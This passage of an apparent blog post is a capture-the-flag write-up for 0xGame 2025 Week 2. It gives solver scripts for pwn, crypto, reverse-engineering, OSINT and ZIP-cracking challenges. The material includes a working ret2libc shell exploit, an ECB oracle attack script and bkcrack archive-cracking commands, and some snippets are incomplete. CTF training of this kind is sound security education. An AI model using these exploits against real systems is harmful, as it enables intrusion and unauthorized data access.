cifrador CFB usando C_1 como IV.\n    cipher = AES.new(key, AES.MODE_CFB, iv=iv_for_decryption)\n    \n    # Descifrar para obtener (padded_flag + urandom_final).\n    decrypted_payload = cipher.decrypt(ciphertext_to_decrypt)\n    \n    print(f\"[+] Contenido descifrado: {decrypted_payload}\")\n\n    # El mensaje original era: padded_flag(48 bytes) + urandom(16 bytes).\n    # Por lo tanto, el contenido descifrado debería tener 64 bytes.\n    if len(decrypted_payload) < 48: # Necesitamos al menos los 48 bytes de la flag.\n         raise ValueError(\"El contenido descifrado es demasiado corto para contener la flag.\")\n\n    # Aislamos los bloques que deberían contener la flag con padding (los primeros 48 bytes del payload).\n    padded_flag = decrypted_payload[:48]\n\n    # Intentar quitar el padding de la parte de la flag.\n    flag = unpad(padded_flag, block_size)\n    \n    flag_str = flag.decode()\n    \n    if flag_str.startswith(\"0xGame{\") and flag_str.endswith(\"}\"):\n        print(\"\\n\" + \"=\"*40)\n        print(f\"[+] ¡ÉXITO! La flag es: {flag_str}\")\n        print(\"=\"*40)\n    else:\n        print(\"\\n[!] Se descifró un texto, pero no parece tener el formato de la flag.\")\n        print(f\"[!] Texto obtenido: {flag_str}\")\n\n\nexcept (ValueError, IndexError) as e:\n    print(f\"\\n[!] ERROR: No se pudo descifrar la flag. Causa probable: {e}\")\n    print(\"[!] Por favor, comprueba que has copiado el texto cifrado completo (160 caracteres hexadecimales).\")\nexcept Exception as e:\n    print(f\"\\n[!] Ocurrió un error inesperado: {e}\")\n```\n\n得到flag：`0xGame{5adccb16-92b6-4d44-89dd-c1e39f6c9338}`\n\n# Osint\n\n## 机场\n\n根据橙黄色廊桥和西藏航空的飞机(Tibet Airlines)可以确定是`珠海金湾机场`，三字码是ZUH，注意这个是大写，然后用网站上的加密工具进行32位小写md5加密，得到`296d0dd1964288715beb8e2d06dca1a5`,就得到flag了。\n\n# Reverse\n\n## baby_python逆向\n\n- 使用`pyinstxtractor`提取文件，运行`python pyinstxtractor.py babyPy.exe`，从.exe中提取.pyc文件(注意这个工具要和目标程序放在同一个目录下。)\n\n- 使用`uncompyle6`反编译，`uncompyle6 babyPy.pyc > decompiled_code.py`,然后就可以在`decompiled_code.py`这个脚本里找到flag了。\n\n- `0xGame{c2a6d59d-34dc-4b94-96aa-e823bdcb4823}`\n\n## baby_java逆向\n\n- `jar -tf BabyJar.jar`分析文件结构\n\n- ```python\n  # 提取所有 class 文件\n  jar -xf BabyJar.jar\n  \n  # 使用 javap 查看字节码（基础信息）\n  javap -c com/BabyJar/demo/BabyJar.class\n  javap -c com/BabyJar/demo/Encrypt.class\n  ```\n\n​\t查看类的基础信息。\n\n- 找到密文`QsY1V5cX9jJyF2JSAgdikwfCEneTAgICUpNnd1Iyk8IXUkJ3QhcyZ8J3YpY=`   和   加密过程`原始flag → 每个字节 XOR 20 → 交换高低4位 → Base64编码 → 比较`\n\n- 解密：`Base64解码 → 交换高低4位 → 每个字节 XOR 20 → 得到原始flag`\n\n- 完整exp：\n\n  ```python\n  import base64\n  \n  # 硬编码的密文\n  encoded = \"QsY1V5cX9jJyF2JSAgdikwfCEneTAgICUpNnd1Iyk8IXUkJ3QhcyZ8J3YpY=\"\n  \n  # Base64 解码\n  encrypted_bytes = base64.b64decode(encoded)\n  \n  # 逆向加密过程\n  def decrypt(data):\n      result = []\n      for byte in data:\n          # 1. 先交换高低4位（逆向第一步）\n          swapped = ((byte & 0x0F) << 4) | ((byte & 0xF0) >> 4)\n          # 2. 再与 key=20 进行 XOR（逆向第二步）\n          decrypted = swapped ^ 20\n          result.append(decrypted)\n      return bytes(result)\n  \n  # 解密\n  decrypted = decrypt(encrypted_bytes)\n  flag = decrypted.decode('utf-8')\n  print(f\"Flag: {flag}\")\n  ```\n\n  得到flag：`0xGame{73e214d2-d85c-4441-bc17-8e10c0e7b8c2}`.\n\n## 16位程序与asm汇编\n\n数据分两个循环两种加密。每23个字节为一段。\n\n```python\n# 完整加密数据\nencrypted = [\n    0x47, 0x7F, 0x52, 0x78, 0x6C, 0x74, 0x7E, 0x72, 0x47, 0x47,\n    0x73, 0x5A, 0x84, 0x5A, 0x43, 0x85, 0x46, 0x5A, 0x83, 0x6F,\n    0x46, 0x5A, 0x6C,  # 前23字节\n    0x33, 0x30, 0x73, 0x32, 0x75, 0x66, 0x37, 0x61, 0x66, 0x33,\n    0x30, 0x78, 0x66, 0x40, 0x35, 0x61, 0x4E, 0x64, 0x34, 0x65,\n    0x32, 0x33, 0x88   # 后23字节\n]\n\n# 分开两部分\npart1 = encrypted[:23]  # 循环1处理\npart2 = encrypted[23:]  # 循环2处理\n\n# 方法1：先sub 9再xor 0E (循环1)\ndecrypted1 = \"\"\nfor byte in part1:\n    decrypted1 += chr(((byte - 9) & 0xFF) ^ 0x0E)\n\n# 方法2：先xor 0E再sub 9 (循环2)  \ndecrypted2 = \"\"\nfor byte in part2:\n    decrypted2 += chr(((byte ^ 0x0E) - 9) & 0xFF)\n\nprint(\"第一部分:\", decrypted1)\nprint(\"第二部分:\", decrypted2)\nprint(\"完整Flag:\", decrypted1 + decrypted2)\n```\n\n逆向解密，得到：`0xGame{g00d_u_4r3_th3_m45t3r_0f_45m_E2f7a1b34}`\n\n很好，你是汇编大师🥰🥰。\n\n## shuffle\n\nIDA里可以看到打乱的flag：`23-64bed6}-xm5300-{faGa34-0e04c2e7c2a78f39a4`,随机数种子1638，MSVC的标准C语言库生成的随机数，和打乱逻辑:\n\n![shuffle](/images/wp/shuffle.png)\n\n编写逆向脚本：\n\n```python\n for idx in range(len(operations) - 1, -1, -1):\n        i, swap_idx = operations[idx]\n        arr[i], arr[swap_idx] = arr[swap_idx], arr[i]\n    \n    return ''.join(arr)\n\n```\n\n得到flag：`0xGame{5ffa9030-e204-4673-b4c6-ed433aca7228}`\n\n## TELF\n\n010的使用:在光标处键入数据会**自动往后覆盖**，实现替换。(或者选中某块数据然后开始键入，修改替换掉该块的数据。)注意不要删除，删了之后再键入就是继续往后覆盖数据了。这就不能实现该数据块的替换了，反而替换掉了后面不该替换的数据。**删除不要乱点！**\n\n```python\nimport struct\nimport ctypes\n\nlibc = ctypes.CDLL('libc.so.6')  \n\n# 定义 srand 和 rand 函数的原型\nlibc.srand.argtypes = [ctypes.c_uint]\nlibc.srand.restype = None\nlibc.rand.argtypes = []\nlibc.rand.restype = ctypes.c_int\n\ndef get_keys():\n    seed = 0xF6950\n    libc.srand(seed)\n    keys = [(libc.rand()) for _ in range(4)]\n    return keys\n\ndef decrypt(v, k):\n    \"\"\"\n    使用 TEA 算法解密一个 64 位的数据块。\n    v: 一个包含两个 32 位无符号整数的元组 (v0, v1)。\n    k: 一个包含四个 32 位整数的密钥数组。\n    \"\"\"\n    v0, v1 = v\n    delta = 0x9e3779b9\n    num_rounds = 32\n    sum_val = (delta * num_rounds) & 0xFFFFFFFF\n    for _ in range(num_rounds):\n        term1 = ((v0 << 4) + k[2]) & 0xFFFFFFFF\n        term2 = (v0 + sum_val) & 0xFFFFFFFF\n        term3 = ((v0 >> 5) + k[3]) & 0xFFFFFFFF\n        v1 = (v1 - (term1 ^ term2 ^ term3)) & 0xFFFFFFFF\n        term1 = ((v1 << 4) + k[0]) & 0xFFFFFFFF\n        term2 = (v1 + sum_val) & 0xFFFFFFFF\n        term3 = ((v1 >> 5) + k[1]) & 0xFFFFFFFF\n        v0 = (v0 - (term1 ^ term2 ^ term3)) & 0xFFFFFFFF\n        sum_val = (sum_val - delta) & 0xFFFFFFFF\n    return v0, v1\n\ndef main():\n    enc = bytes([\n        0xAD, 0xDA, 0x01, 0xDC, 0xAE, 0x5B, 0x8A, 0x08,\n        0x4E, 0xF5, 0x4F, 0x8F, 0x6E, 0x5F, 0x9D, 0x9E,\n        0x0A, 0x4E, 0xA9, 0x08, 0x25, 0xAB, 0x45, 0xC2,\n        0x4B, 0xC9, 0x8F, 0x43, 0x3D, 0x51, 0xD6, 0x28,\n        0xF6, 0x72, 0xCD, 0xF4, 0x2B, 0xB4, 0x4A, 0x3B,\n        0xFB, 0x36, 0x66, 0xEF, 0xD6, 0x8A, 0x8C, 0xB2,\n        0xEB, 0x1A, 0x9C, 0x1B, 0x0A, 0x9C, 0x1F, 0x53\n    ])\n    keys = get_keys()\n\n    decrypted_flag = b\"\"\n    for i in range(0, len(enc), 8):\n        chunk = enc[i:i+8]\n        v = struct.unpack('<2I', chunk)\n        decrypted_v = decrypt(v, keys)\n        decrypted_chunk = struct.pack('<2I', decrypted_v[0], decrypted_v[1])\n        decrypted_flag += decrypted_chunk\n        flag_str = decrypted_flag.decode('utf-8').rstrip('\\x00')\n        print(f\"{{flag_str}}\")\n\n\nif __name__ == \"__main__\":\n    main()\n```\n\n首先是upx脱壳，但是upx标签被修改成了X1c，用010替换X1c为UPX然后就能脱壳了，脱完之后就能逆向了,得到:\n\n`0xGame{PANDORA-PANRADOXXX-101AP-9CDE02B83F5D6-7B1A9C348}`  flag .\n\n# Misc\n\n## 明文攻击\n\n- 先构造一个png文件，，bkcrack只需要12个字节的明文就能爆破，`89 50 4E 47 0D 0A 1A 0A 00 00 00 0D 49 48 44 52`，文件头是这个。\n\n- 运行`bkcrack.exe -C attachment.zip -c huiliyi.png -p 01.png`，爆破得到`cdc564be 5675041f 719adb56`密钥。\n\n- 最后`bkcrack.exe -C attachment.zip -c flag.txt -k cdc564be 5675041f 719adb56 -d flag_decrypted.txt`得到flag\n- `0xGame{Y0u_cRacked_M3!z1p_1s_uNsafe!}`\n","source":"_posts/0xGame2025Week2WP.md","raw":"---\ntitle: 0xGame Week2 WP\ndate: 2025-10-19\ncategories: pwn\ntop_img: /images/background/东方/01.jpg\ncover: /images/background/东方/01.jpg\n---\n\n\n\n\n\n# pwn\n\n## ret2libc\n\n```python\nio=remote(\"nc1.ctfplus.cn\",30264)\nmain=0x40122D\ngot=0x404018\nplt=0x401070\nrdi=0x40119e\nret=0x40122c\nio.recvuntil(b\"Input something: \\n\")\npayload=b'a'*0x48+p64(rdi)+p64(got)+p64(plt)+p64(main)\nio.send(payload)\nlibc=ELF('./libc.so.6')\nbase=u64(io.recv(6).ljust(8,b'\\x00'))-libc.sym.puts\nprint(hex(base))\nsym=libc.sym.system+base\nsh=next(libc.search(\"/bin/sh\"))+base\npayload=b'a'*0x48+p64(ret)+p64(rdi)+p64(sh)+p64(sym)\nio.recvuntil(b\"Input something: \\n\")\nio.sendline(payload)\nio.interactive()\n```\n\n先把libc的基址找出来，然后再构造ROP链。\n\n## 多线程\n\n```python\nio=remote(\"nc1.ctfplus.cn\",32640)\nio.sendline(b\"a\")\nfor i in range(0x40):\n    io.sendline(b\"2\")\nio.sendline(b\"3\")\nio.interactive()\n```\n\n得到`0xGame{Thr3@ds_c@nn0t_b3_w1th0ut_l0cks}`\n\n## 高数😫😫\n\n![eval](/images/wp/eval.png)\n\n这个**条件**和**循环**结构够我学一辈子😭😭\n\nflag：`0xGame{Ur_@n_excel1ent_bl@ster}`\n\n# Crypto\n\n## Orcale\n\n爆破\n\n```python\nimport socket\nimport string\nimport time\n\n# --- 连接信息 ---\nHOST = 'nc1.ctfplus.cn'\nPORT = 49725\nBLOCK_SIZE = 16\n\n# --- I/O 辅助函数 ---\ndef recv_until(s, delim):\n    \"\"\"从 socket 中接收数据，直到遇到指定的分隔符 delim。\"\"\"\n    data = b\"\"\n    while not data.endswith(delim):\n        try:\n            chunk = s.recv(1)\n            if not chunk:  # 连接已关闭\n                return None\n            data += chunk\n        except socket.timeout:\n            print(\"[-] Socket timeout.\")\n            return None\n    return data\n\ndef get_encryption(s, payload_hex):\n    \"\"\"\n    在一个已建立的 socket 连接上，发送一次加密请求并获取结果。\n    \"\"\"\n    try:\n        # 1. 回答 'y' 继续加密\n        s.sendall(b'y\\n')\n        recv_until(s, b'[-] Plaintext(in hex):')\n        \n        # 2. 发送我们的 payload\n        s.sendall(payload_hex.encode() + b'\\n')\n        \n        # 3. 解析返回的密文\n        recv_until(s, b'[+] Ciphertext: ')\n        response_line = recv_until(s, b'\\n')\n        if response_line:\n            return response_line.strip().decode()\n        return None\n    except (socket.error, BrokenPipeError):\n        print(\"[-] Network error occurred during communication.\")\n        return None\n\n# --- 主攻击逻辑 ---\ndef solve():\n    \"\"\"\n    执行 ECB 逐字节攻击的主函数。\n    \"\"\"\n    # 建立一个持久连接\n    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n    s.settimeout(5)\n    \n    try:\n        s.connect((HOST, PORT))\n        # 清理掉第一个 \"Continue?\" 提示\n        recv_until(s, b'y/[n])?')\n    except socket.error as e:\n        print(f\"[-] Failed to connect to {HOST}:{PORT}. Error: {e}\")\n        return\n\n    known_flag = b'0xGame{'\n    print(f\"[*] Starting ECB byte-at-a-time attack with known prefix: {known_flag.decode()}\")\n    print(\"-\" * 50)\n\n    try:\n        while not known_flag.endswith(b'}'):\n            # 1. 对齐步骤 (Alignment)\n            # 构造填充物 (padding)，其长度能让下一个未知字节恰好落在16字节块的末尾\n            # 例如，当 known_flag 长度为7时, 我们需要 15-7=8 个 'A'\n            padding_len = (BLOCK_SIZE - 1) - (len(known_flag) % BLOCK_SIZE)\n            padding = b'A' * padding_len\n            \n            # 发送这个对齐用的 payload，获取目标密文\n            # 服务器会加密: pad(padding + flag, 16)\n            response_hex = get_encryption(s, padding.hex())\n            if not response_hex:\n                print(\"[-] Failed to get response from oracle during alignment.\")\n                break\n            \n            # 我们感兴趣的密文块，是包含第一个未知字节的那一块\n            # 它的索引可以通过 (padding长度 + 已知flag长度) / 16 来计算\n            target_block_index = (len(padding) + len(known_flag)) // BLOCK_SIZE\n            start_pos = target_block_index * BLOCK_SIZE * 2  # 1字节=2个hex字符\n            end_pos = start_pos + (BLOCK_SIZE * 2)\n            target_block = response_hex[start_pos:end_pos]\n\n            # 2. 爆破步骤 (Brute-force)\n            found_char = False\n            # 优先尝试常见的 flag 字符集\n            charset = (string.ascii_letters + string.digits + \"_-!{}?@#$\").encode('latin-1')\n\n            for char_code in charset:\n                guess_char = bytes([char_code])\n                \n                # 构造测试 payload: padding + known_flag + guess\n                # 服务器会加密: pad(padding + known_flag + guess + rest_of_flag, 16)\n                # 这个构造使得 (padding + known_flag + guess) 组成一个或多个完整的块\n                test_payload = padding + known_flag + guess_char\n                \n                test_response_hex = get_encryption(s, test_payload.hex())\n                if not test_response_hex:\n                    # 如果单次请求失败，跳过这个字符，避免程序崩溃\n                    continue\n\n                # 提取相同位置的密文块进行比较\n                test_block = test_response_hex[start_pos:end_pos]\n                \n                if test_block == target_block:\n                    known_flag += guess_char\n                    # 使用 'ignore' 以避免非UTF-8字符打印时出错\n                    print(f\"[+] Found: '{guess_char.decode('latin-1', 'ignore')}'  ->  Flag: {known_flag.decode('latin-1', 'ignore')}\")\n                    found_char = True\n                    break\n            \n            if not found_char:\n                print(\"\\n[-] Attack failed. Could not find the next character in the charset.\")\n                break\n    \n    finally:\n        print(\"-\" * 50)\n        if known_flag.endswith(b'}'):\n            print(f\"[!] Success! Full flag found: {known_flag.decode('latin-1', 'ignore')}\")\n        else:\n            print(f\"[*] Attack stopped. Partial flag: {known_flag.decode('latin-1', 'ignore')}\")\n        s.close()\n\nif __name__ == '__main__':\n    solve()\n```\n\n得到`0xGame{5679df1b-4bae-4715-8433-4d52ccb258ef}`\n\n## LFSR\n\n线性反馈移位寄存器。\n\n```python\nfrom Crypto.Cipher import AES\n\ndef int_to_bits(x, bit_length):\n    \"\"\"将整数转为比特列表，高位在前\"\"\"\n    return [(x >> i) & 1 for i in reversed(range(bit_length))]\n\ndef bits_to_int(bits):\n    \"\"\"将比特列表转为整数\"\"\"\n    return int(''.join(str(b) for b in bits), 2)\n\ndef lfsr_step(state, mask, length=128):\n    \"\"\"模拟LFSR的一步\"\"\"\n    output = 0\n    for i in range(length):\n        output ^= state[i] & mask[i]\n    new_state = state[1:] + [output]\n    return new_state, output\n\ndef recover_mask_from_keystream(keystream, n=128):\n    \"\"\"从密钥流恢复mask\"\"\"\n    # 构建线性方程组: 对于 i = n 到 2n-1\n    # keystream[i] = mask · [keystream[i-n], ..., keystream[i-1]]\n    A = []\n    b = []\n    \n    for i in range(n, 2*n):\n        # 状态向量是前n个输出比特\n        state_vector = keystream[i-n:i]\n        A.append(state_vector)\n        b.append(keystream[i])\n    \n    # GF(2)上的高斯消元\n    size = n\n    mat = [row + [b[i]] for i, row in enumerate(A)]\n    \n    # 前向消元\n    for col in range(size):\n        # 找到主元\n        pivot = -1\n        for row in range(col, size):\n            if mat[row][col] == 1:\n                pivot = row\n                break\n        if pivot == -1:\n            continue\n            \n        # 交换行\n        mat[col], mat[pivot] = mat[pivot], mat[col]\n        \n        # 消去其他行\n        for row in range(col + 1, size):\n            if mat[row][col] == 1:\n                for j in range(col, size + 1):\n                    mat[row][j] ^= mat[col][j]\n    \n    # 回代求解\n    mask = [0] * size\n    for i in reversed(range(size)):\n        if mat[i][i] == 0:\n            if mat[i][size] == 0:\n                # 自由变量，设为0\n                mask[i] = 0\n            else:\n                print(f\"矛盾方程 at row {i}\")\n                return None\n        else:\n            mask[i] = mat[i][size]\n            for j in range(i + 1, size):\n                mask[i] ^= mat[i][j] & mask[j]\n    \n    return mask\n\n# 已知数据\nrandom1 = 79262982171792651683253726993186021794\nrandom2 = 121389030069245976625592065270667430301\nciphertext = b'\\xb9WE<\\x8bC\\xab\\x92J7\\xa9\\xe6\\xe8\\xd8\\x93D\\xcc\\xac\\xfdvfZ}C\\xe6\\xd8;\\xf7\\x18\\xbauz`\\xb9\\xe0\\xe6\\xc6\\xae\\x00\\xfb\\x96%;k{Ph\\xfa'\n\nprint(\"分析LFSR...\")\n\n# 检查数值\nprint(f\"random1: {random1}\")\nprint(f\"random2: {random2}\")\nprint(f\"random1 比特长度: {random1.bit_length()}\")\nprint(f\"random2 比特长度: {random2.bit_length()}\")\n\n# 转为比特序列（确保128位）\nbits1 = int_to_bits(random1, 128)\nbits2 = int_to_bits(random2, 128)\nkeystream = bits1 + bits2\n\nprint(f\"密钥流长度: {len(keystream)} 比特\")\n\n# 方法1: 直接解线性方程组\nprint(\"\\n方法1: 解线性方程组...\")\nmask_bits = recover_mask_from_keystream(keystream)\nif mask_bits:\n    mask = bits_to_int(mask_bits)\n    print(f\"找到 mask: {hex(mask)}\")\n    \n    # 验证mask\n    test_state = bits1[:]  # 初始状态是random1的比特\n    test_mask = mask_bits\n    generated = []\n    for _ in range(256):\n        test_state, out = lfsr_step(test_state, test_mask)\n        generated.append(out)\n    \n    # 检查是否匹配\n    if generated[128:256] == bits2:\n        print(\"✓ Mask 验证成功!\")\n    else:\n        print(\"✗ Mask 验证失败\")\n    \n    # 解密\n    for order in ['big', 'little']:\n        key = mask.to_bytes(16, order)\n        cipher = AES.new(key, AES.MODE_ECB)\n        plaintext = cipher.decrypt(ciphertext)\n        print(f\"\\n{order} 顺序解密:\")\n        try:\n            decoded = plaintext.decode('utf-8', errors='ignore')\n            print(f\"解码: {decoded}\")\n            if '0xGame' in decoded or 'flag' in decoded or '{' in decoded:\n                print(\"*** 找到 flag! ***\")\n        except:\n            print(f\"原始字节: {plaintext}\")\nelse:\n    print(\"方法1失败\")\n\n# 方法2: 如果上面失败，尝试暴力搜索附近的mask值\nprint(\"\\n方法2: 尝试附近可能的mask值...\")\nif mask_bits:\n    base_mask = bits_to_int(mask_bits)\n    # 尝试一些变体\n    for shift in range(-10, 11):\n        test_mask = (base_mask + shift) & ((1 << 128) - 1)\n        for order in ['big', 'little']:\n            try:\n                key = test_mask.to_bytes(16, order)\n                cipher = AES.new(key, AES.MODE_ECB)\n                plaintext = cipher.decrypt(ciphertext)\n                if b'0xGame' in plaintext:\n                    print(f\"找到 flag! mask={hex(test_mask)}, order={order}\")\n                    print(f\"Flag: {plaintext}\")\n                    break\n            except:\n                pass\n```\n\n得到`0xGame{124ab3f1-4c3e-4d2a-8e6f-9b5e6c7d8f90}`\n\n## ECC\n\n大步小步法计算私钥s。\n\n```python\nfrom hashlib import sha256\nfrom Crypto.Cipher import AES\nimport math\n\n# ===============================================================\n# 第一部分：椭圆曲线和 Point 类的定义\n# ===============================================================\n\n# 椭圆曲线 secp256r1 (NIST P-256) 的参数\np = 0xffffffff00000001000000000000000000000000ffffffffffffffffffffffff\na = 0xffffffff00000001000000000000000000000000fffffffffffffffffffffffc\nb = 0x5ac635d8aa3a93e7b3ebbd55769886bc651d06b0cc53b0f63bce3c3e27d2604b\n\n# 辅助函数：计算模逆元\n# 使用扩展欧几里得算法\ndef inv(n, p):\n    return pow(n, p - 2, p)\n\nclass Point:\n    \"\"\"\n    一个表示 secp256r1 椭圆曲线上点的类\n    \"\"\"\n    def __init__(self, x, y):\n        self.x = x\n        self.y = y\n        self.a = a\n        self.b = b\n        self.p = p\n\n    # 定义点加法\n    def __add__(self, other):\n        # 处理无穷远点 (用 None 表示)\n        if other is None:\n            return self\n\n        # 两个点相同，执行点倍增\n        if self == other:\n            # lam = (3 * x^2 + a) / (2 * y) mod p\n            lam = (3 * self.x * self.x + self.a) * inv(2 * self.y, self.p) % self.p\n        else: # 两个点不同\n            # lam = (y2 - y1) / (x2 - x1) mod p\n            lam = (other.y - self.y) * inv(other.x - self.x, self.p) % self.p\n        \n        # 计算新点的坐标\n        # x3 = lam^2 - x1 - x2 mod p\n        x3 = (lam * lam - self.x - other.x) % self.p\n        # y3 = lam * (x1 - x3) - y1 mod p\n        y3 = (lam * (self.x - x3) - self.y) % self.p\n        \n        return Point(x3, y3)\n\n    # 定义标量乘法 (s * P)\n    def __mul__(self, s):\n        current = self\n        res = None # 这是无穷远点\n        \n        # 使用快速幂的思想 (二进制展开法)\n        while s > 0:\n            if s & 1: # 如果当前位是 1\n                if res is None:\n                    res = current\n                else:\n                    res = res + current\n            current = current + current # 点倍增\n            s >>= 1 # 右移一位\n        return res\n\n    # 定义点的相等性\n    def __eq__(self, other):\n        if other is None:\n            return False\n        return self.x == other.x and self.y == other.y\n\n    # 为了能将 Point 对象作为字典的键，需要定义 __hash__\n    def __hash__(self):\n        return hash((self.x, self.y))\n    \n    # 定义点的相反数\n    def __neg__(self):\n        return Point(self.x, -self.y % self.p)\n\n    # 方便打印\n    def __repr__(self):\n        return f\"({self.x}, {self.y})\"\n\n# ===============================================================\n# 第二部分：实现并运行大步小步法 (BSGS) 来找到 s\n# ===============================================================\n\ndef bsgs(base_point, target_point, search_limit):\n    \"\"\"\n    使用大步小步法求解椭圆曲线离散对数问题 (s * base_point = target_point)\n    :param base_point: 基点 P\n    :param target_point: 目标点 Q\n    :param search_limit: s 的最大搜索范围 (2^40)\n    :return: 整数 s\n    \"\"\"\n    m = int(math.sqrt(search_limit)) + 1\n    print(f\"步长 (m) 设置为: {m}\")\n\n    # 1. 计算小步 (Baby Steps) 并存入哈希表\n    baby_steps_table = {}\n    current_point = None # 0 * P\n    for j in range(m):\n        if current_point not in baby_steps_table:\n            baby_steps_table[current_point] = j\n        if current_point is None:\n            current_point = base_point\n        else:\n            current_point = current_point + base_point\n    print(\"小步表已生成完成。\")\n    \n    # 2. 计算大步的步进 (mP)\n    mP = base_point * m\n    mP_inv = -mP\n\n    # 3. 计算大步 (Giant Steps) 并查找匹配\n    giant_step_point = target_point\n    for i in range(m):\n        # 查找 Q - i*m*P 是否在小步表中\n        if giant_step_point in baby_steps_table:\n            j = baby_steps_table[giant_step_point]\n            s = i * m + j\n            # 由于0*P和负点的情况，可能需要微调\n            if base_point * s == target_point:\n                 return s\n        giant_step_point = giant_step_point + mP_inv\n    \n    return None # 没有找到解\n\n# ===============================================================\n# 第三部分：整合并执行解密\n# ===============================================================\n\nif __name__ == '__main__':\n    # 题目中给出的 P 和 Q 的坐标\n    P_coords = (96072097493962089165616681758527365503518618338657020069385515845050052711198, 106207812376588552122608666685749118279489006020794136421111385490430195590894)\n    Q_coords = (100307267283773399335731485631028019332040775774395440323669585624446229655081, 22957963484284064705317349990185223707693957911321089428005116099172185773154)\n\n    # 创建 Point 对象\n    P = Point(P_coords[0], P_coords[1])\n    Q = Point(Q_coords[0], Q_coords[1])\n    \n    # s 的最大值是 2^40\n    search_space = 2**40\n    \n    print(\"正在使用大步小步法计算私钥 s，这可能需要一分钟左右...\")\n    s = bsgs(P, Q, search_space)\n\n    if s is not None:\n        print(f\"成功找到私钥 s: {s}\\n\")\n        \n        # 使用找到的 s 进行解密\n        print(\"正在使用 s 生成密钥并解密...\")\n        key = sha256(str(s).encode()).digest()\n        \n        ciphertext = b':\\xe5^\\xd2s\\x92kX\\x96\\x12\\xb7dT\\x1am\\x94\\x86\\xcd.\\x84*-\\x93\\xb5\\x14\\x8d\\x99\\x94\\x92\\xfaCE\\xbd\\x01&?\\xe1\\x01f\\xef\\x8f\\xe3\\x13\\x13\\x96\\xa6\\x0f\\xc0'\n        \n        cipher = AES.new(key, AES.MODE_ECB)\n        \n        decrypted_padded = cipher.decrypt(ciphertext)\n        \n        # 去除 PKCS7 填充\n        padding_len = decrypted_padded[-1]\n        flag = decrypted_padded[:-padding_len]\n        \n        print(\"\\n\" + \"=\"*40)\n        try:\n            print(f\"解密成功！ Flag 是: {flag.decode()}\")\n        except UnicodeDecodeError:\n            print(f\"解密成功！ Flag (原始字节): {flag}\")\n        print(\"=\"*40)\n\n    else:\n        print(\"未能找到 s。\")\n```\n\n得到![image-20251009211926304](C:\\Users\\ASUS\\AppData\\Roaming\\Typora\\typora-user-images\\image-20251009211926304.png)\n\nflag:`0xgame{ECC_1s_4w3s0m3_but_n0t_perf3ct}`\n\n## 流密码\n\n已知加密key的明文是key*5,加密flag是32字节，所以msg也是32字节。两个密文是同一个RC4密钥加密的，我们可以求出密钥流的前32字节:\n\n```python\nkeystream = ciphertext_key[:32] ⊕ P2[:32]\n```\n\n然后用该密钥就能求出msg：\n\n```python\nmsg = ciphertext_flag ⊕ keystream\n```\n\n完整解密脚本：\n\n```python\nciphertext_flag = b'n\\xab\\xa8\\xf6%\\xf5\\xbd\\xc5\\x97\\xe0\\xa0zCpV{\\x04&\\x8a\\xe5\\xe1TP\\xe0'\nciphertext_key = b'\\x83=x{\\xbcb\\r^3nl\\xbe\\xf4\\xdb\\xe5\\xc5\\x86\\x9e-Rt\\xf9\\x93\\t\\x883I\\xdd\\xcdx\\x01\"\\xb6d\\xd3A\\xa47|\\x8d\\xf8\\xe9\\xb1\\x04\\xfaz\\x83t\\xd5\\x85\\xd19\\xfd\\xbc\\x88\\xc8\\x05fJZ\\xae\\xba%\\x04B\\xd6a>\\xf7\\xc6B\\xc0`\\xc2\\xc4\\x10\\x83BbJ'\n\nkey_known = b\"This is keyyyyyy\" * 5\n\n# 取前 32 字节\nkey_part = key_known[:32]\ncipher_key_part = ciphertext_key[:32]\n\nkeystream = bytes(a ^ b for a, b in zip(cipher_key_part, key_part))\n\nmsg = bytes(a ^ b for a, b in zip(ciphertext_flag, keystream))\n\nprint(\"msg =\", msg)\nprint(msg.decode('gbk'))\n```\n\n后面发现这居然是GBK编码 ( ?   于是加了这一行`print(msg.decode('gbk'))`，得到flag：`0xGame{哈哈哈没想到我是中文的吧}`\n\n## LCG\n\nRNG=1，得到`Encrypted flag: [1935545177, 482262980, 1684118578, 997149554, 47161616, 102144924, 4155440928, 2213608845, 3538556139, 2928111657, 1154771317, 2133944243, 4148979403, 858055706, 3202218392, 1727302179, 3882966344, 1327689887, 3674970320, 2187841171, 2311252450, 482971802, 1729193547, 358579918, 927519716, 1913893602, 1846075319, 1560219121, 3400251736, 2548802464, 684657754, 989524061, 324600525, 197683993, 1609214168, 3772472918]`所以flag是36字节。\n\n先找RNG状态序列：从 `seed=1` 开始迭代 RNG，直到状态重复，记录所有状态序列 `states`。\n\n枚举a和b：因为 `a` 和 `b` 是 `states[k1]` 和 `states[k2]`，其中 `k1, k2` 在 `[1, 1024]` 范围内（因为 `random.randint(1, 1024)`），所以取 `a = states[i]`, `b = states[j]`，其中 `i` 和 `j` 从 1 到 min(1024, len(states))\n\n完整exp:\n\n```python\nfrom Crypto.Util.number import inverse\n\nMOD = 2**32 + 1\n\ncoefficients = [77549, 468297, 447715, 99019, 1039399, 618114, 67952, 512021, 390981, 412152]\nenc_flag = [1935545177, 482262980, 1684118578, 997149554, 47161616, 102144924, 4155440928, 2213608845, 3538556139, 2928111657, 1154771317, 2133944243, 4148979403, 858055706, 3202218392, 1727302179, 3882966344, 1327689887, 3674970320, 2187841171, 2311252450, 482971802, 1729193547, 358579918, 927519716, 1913893602, 1846075319, 1560219121, 3400251736, 2548802464, 684657754, 989524061, 324600525, 197683993, 1609214168, 3772472918]\n\nclass RNG():\n    def __init__(self, coefficients, seed, MOD=2**20):\n        self.coefficients = coefficients\n        self.state = seed\n        self.MOD = MOD\n        self.f = lambda x: sum(c * (x ** i) for i, c in enumerate(coefficients)) % MOD\n\n    def next(self):\n        self.state = self.f(self.state)\n        return self.state\n\n# 生成 RNG 状态序列（足够长，比如 5000 个状态，确保覆盖循环）\nseed = 1\nrng = RNG(coefficients, seed)\nstates = [seed]\nfor _ in range(5000):\n    nxt = rng.next()\n    if nxt == states[0]:\n        break\n    states.append(nxt)\n\nprint(f\"Generated {len(states)} unique RNG states\")\n\n# 枚举 a 和 b 的可能值（索引从 1 到 1024）\nfound = False\nfor i in range(1, min(1025, len(states))):\n    a = states[i]\n    if gcd(a, MOD) != 1:\n        continue\n    inv_a = inverse(a, MOD)\n    for j in range(1, min(1025, len(states))):\n        b = states[j]\n        plain = []\n        for c in enc_flag:\n            possible_byte = None\n            state_val = c\n            # 反向 1 到 1024 步\n            for step in range(1, 1025):\n                state_val = (state_val - b) * inv_a % MOD\n                if 0 <= state_val <= 255:\n                    if possible_byte is None:\n                        possible_byte = state_val\n                    else:\n                        # 